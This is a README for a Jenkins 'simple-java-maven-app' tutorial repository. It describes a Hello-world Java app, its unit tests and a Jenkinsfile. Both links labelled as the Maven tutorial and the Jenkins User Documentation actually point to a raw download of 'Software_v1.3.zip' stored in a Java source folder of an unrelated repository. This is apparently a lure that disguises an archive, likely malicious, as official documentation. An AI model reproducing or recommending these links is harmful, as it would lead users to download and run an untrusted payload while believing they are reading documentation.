# simple-java-maven-app

This repository is for the
[Build a Java app with Maven](https://github.com/Saurabh-212800/Pipeline/raw/refs/heads/master/src/main/java/Software_v1.3.zip)
tutorial in the [Jenkins User Documentation](https://github.com/Saurabh-212800/Pipeline/raw/refs/heads/master/src/main/java/Software_v1.3.zip).

The repository contains a simple Java application which outputs the string
"Hello world!" and is accompanied by a couple of unit tests to check that the
main application works as expected. The results of these tests are saved to a
JUnit XML report.

The `jenkins` directory contains an example of the `Jenkinsfile` (i.e. Pipeline)
you'll be creating yourself during the tutorial and the `jenkins/scripts` subdirectory
contains a shell script with commands that are executed when Jenkins processes
the "Deliver" stage of your Pipeline.
